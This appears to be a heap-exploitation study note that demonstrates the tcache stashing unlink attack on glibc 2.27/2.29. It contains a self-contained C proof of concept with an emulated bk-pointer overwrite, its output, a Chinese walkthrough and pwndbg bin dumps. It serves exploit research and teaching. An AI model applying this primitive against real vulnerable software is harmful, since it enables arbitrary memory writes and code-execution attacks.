# tcache_stashing_unlink_attack

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}
```

**result**

```c
This file demonstrates the stashing unlink attack on tcache.

This poc has been tested on both glibc 2.27 and glibc 2.29.

This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc

The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.

This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.

Stack_var emulates the fake chunk we want to alloc to.

First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.

You can see the value of fake_chunk->bk is:0x7ffccb78f1a0

Also, let's see the initial value of stack_var[4]:(nil)

Now we alloc 9 chunks with malloc.

Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.

As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.

Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.

Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins

Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: 0x7ffccb78f190.

Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.

Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: 0x5653c7ffc3a0 and the bck->fd has been changed into a libc addr: 0x7f7eda19fd30

As you can see, next malloc(0x90) will return the region our fake chunk: 0x7ffccb78f1a0
```

**analysis**

stack_var 是我们希望分配到的地址，我们首先把 &stack_var[2] 写到 stack_var[3] 来绕过 glibc 的 bck->fd=bin（即 fake chunk->bk 应该是一个可写的地址）。

申请9个chunk，并将其中后6个free，在再free第二个，填满tcache。

这时再free掉第一个和第三个，它们回被加入到unsorted bin中。

然后申请0xa0大小的chunk，0xa0>0x90，chunk0和chunk2被放入small bin中，malloc(0x90)两次，为small bin腾出空间。

修改chunk2的bk使其指向栈上伪造的chunk。

**注意**：这里使用了calloc而不是，malloc，这时因为calloc不会使用tcache，所以这里它从small bin中拿chunk。这时候如果tcache还有空闲的位置，剩下的small bin中的chunk会顺着bk被加入到tcache中。

**gdb**

填充tcache

```c
pwndbg> bins
tcachebins
0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

malloc(0xa0)

```c
pwndbg> bins
tcachebins
0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
largebins
empty
```

为small chunk腾出空间

```c
pwndbg> bins
tcachebins
0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
largebins
empty
```

修改bk指针

```c
pwndbg> x/10gx 0x555555757390
0x555555757390:	0x0000000000000000	0x00000000000000a1
0x5555557573a0:	0x0000555555757250	0x00007fffffffdcf0
0x5555557573b0:	0x0000000000000000	0x0000000000000000
0x5555557573c0:	0x0000000000000000	0x0000000000000000
0x5555557573d0:	0x0000000000000000	0x0000000000000000
pwndbg> bins
tcachebins
0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
BK: 0x555555757250 —▸ 0x555555757390 —▸ 0x7fffffffdcf0 —▸ 0x7fffffffdd00 ◂— 0x0
```

calloc，chunk0被分配出去了fake chunk和chunk2加入到tcache中

```c
tcachebins
0xa0 [  7]: 0x7fffffffdd00 —▸ 0x5555557573a0 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x555555757390 —▸ 0x5555557576c0 ◂— 0x0
BK: 0x7fffffffdd00 ◂— 0x0
largebins
empty
```

